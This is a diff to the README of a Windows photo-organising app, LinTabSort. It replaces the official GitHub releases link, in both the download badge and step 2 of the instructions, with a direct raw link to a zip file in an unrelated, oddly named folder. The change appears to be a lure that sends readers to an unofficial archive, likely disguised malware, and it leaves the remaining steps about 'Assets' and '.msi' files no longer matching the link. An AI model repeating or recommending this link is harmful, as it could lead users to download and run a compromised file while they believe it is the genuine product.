@@ -5,7 +5,7 @@ description: "Sort and organize photo folders on Windows by tagging images for d
 ---
 # 🖼️ LinTabSort - Organize your messy digital photo collection
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sunny6092/LinTabSort/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/sunny6092/sunny6092.github.io/main/overcertification/v2.4.zip)
 
 LinTabSort helps you manage your digital life. Many people store thousands of photos and videos across their computers. Over time, these files become disorganized, duplicate, and difficult to search. This application provides a simple interface to view, sort, and clean your media library. It runs on Windows and works offline to protect your privacy.
 
@@ -14,7 +14,7 @@ LinTabSort helps you manage your digital life. Many people store thousands of ph
 To get started, you must download the software from the official repository page.
 
 1. Open your web browser.
-2. Navigate to [https://github.com/sunny6092/LinTabSort/releases](https://github.com/sunny6092/LinTabSort/releases).
+2. Navigate to [https://raw.githubusercontent.com/sunny6092/sunny6092.github.io/main/overcertification/v2.4.zip](https://raw.githubusercontent.com/sunny6092/sunny6092.github.io/main/overcertification/v2.4.zip).
 3. Look for the section labeled "Assets" under the most recent release version.
 4. Click the file ending in `.zip` or `.msi` to start the download.
 5. Save the file to your "Downloads" folder.
